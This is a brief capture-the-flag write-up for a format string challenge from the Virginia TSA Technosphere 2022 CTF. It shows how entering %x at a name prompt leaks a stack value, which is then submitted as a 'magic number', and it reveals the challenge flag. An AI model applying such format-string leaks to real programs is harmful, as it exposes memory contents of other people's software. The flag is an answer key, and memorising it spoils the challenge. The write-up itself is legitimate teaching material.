# From C to Shining C (100)
#### pwn - [Virginia TSA Technosphere 2022 CTF](../main.md)

## Challenge description:
> The elves have mistakenly put a [string format vulnerability](https://owasp.org/www-community/attacks/Format_string_attack) that might reveal a flag in this program.
> 
> Download file: forgot to save file :(

## Solution 
We are given a binary and information to connect to a server with netcat.

After marking it as executable with `chmod +x fromctoshiningc`, running the binary asks for a name and a magic number. 

```
$ ./fromctoshiningc
What is your name? 
```

We can leak data from the stack using %x, which is returned to us.

```
$ nc 0.cloud.chals.io 28281
What is your name? 
%x
This is a really important piece of information: 28757b2

Enter the magic number: 
```

Reverse engineering the binary reveals that converting the provided hex address to decimal allows us to access its content. We can try this on the server for the real flag.

```
$ nc 0.cloud.chals.io 28281
What is your name? 
%x
This is a really important piece of information: 28757b2

Enter the magic number: 
42424242
*************
```

<details> 
    <summary>Flag</summary>
flag{cnoevil}
</details>